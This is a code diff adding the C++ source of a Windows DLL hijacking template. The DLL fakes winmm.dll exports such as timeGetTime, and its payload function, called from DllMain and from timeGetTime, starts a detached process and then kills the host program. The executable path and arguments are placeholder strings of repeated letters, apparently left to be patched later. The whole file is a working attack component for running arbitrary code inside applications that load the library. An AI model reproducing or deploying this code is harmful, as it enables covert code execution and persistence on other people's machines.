@@ -1,0 +1,52 @@
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include "pch.h"
+
+void payload()
+{
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);	
+	ZeroMemory(&pi, sizeof(pi));
+
+	const char* exePath = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+	const char* args = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
+
+	CreateProcess(exePath, (LPSTR)args, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi);
+
+	ExitProcess(0);
+}
+
+extern "C" __declspec(dllexport) void timeBeginPeriod()
+{}
+extern "C" __declspec(dllexport) void timeEndPeriod()
+{}
+extern "C" __declspec(dllexport) void timeGetTime()
+{
+	payload();
+}
+extern "C" __declspec(dllexport) void waveOutGetNumDevs()
+{}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD ul_reason_for_call,
+	LPVOID lpReserved) {
+
+	payload();
+
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+
+		break;
+	case DLL_PROCESS_DETACH:
+
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return TRUE;
+}
